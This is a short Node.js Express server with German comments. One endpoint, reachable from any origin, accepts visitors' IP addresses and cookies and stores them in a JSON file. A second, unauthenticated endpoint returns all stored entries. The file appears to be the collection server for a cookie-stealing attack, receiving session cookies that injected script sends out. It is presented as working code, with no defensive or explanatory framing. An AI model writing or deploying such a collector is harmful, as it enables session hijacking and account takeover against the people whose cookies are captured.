const express = require("express");
const fs = require("fs");
const cors = require("cors");
const app = express();

app.use(express.json());
app.use(cors());
app.use(express.static("public"));

const DB_FILE = "database.json";

// Cookies speichern
app.post("/save-cookie", (req, res) => {
    const { ip, cookies } = req.body;
    let data = [];

    if (fs.existsSync(DB_FILE)) {
        data = JSON.parse(fs.readFileSync(DB_FILE));
    }

    data.push({ ip, cookies, timestamp: new Date() });

    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
    res.json({ message: "Cookies gespeichert!" });
});

// Alle gespeicherten Cookies abrufen
app.get("/get-cookies", (req, res) => {
    if (fs.existsSync(DB_FILE)) {
         res.json(JSON.parse(fs.readFileSync(DB_FILE)));
    } else {
        res.json([]);
    }
});

app.listen(3000, () => console.log("Server läuft auf http://localhost:3000"));
